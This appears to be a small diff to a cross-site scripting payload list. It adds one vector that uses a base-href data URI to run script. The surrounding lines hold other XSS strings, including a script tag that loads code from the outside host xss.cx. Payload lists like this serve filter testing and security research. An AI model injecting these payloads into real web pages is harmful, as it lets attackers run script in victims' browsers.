@@ -1218,3 +1218,4 @@ alert(1 ===  1)
 <svg><script>alert&#40 1&#41<b>
 <svg><script/href="xss.cx/xss.js"//>
 <a href="#" onClick="alert(document.domain)"><img title="Click me" /></a>
+<base href=data:/,0/><script src=alert(1)></script>
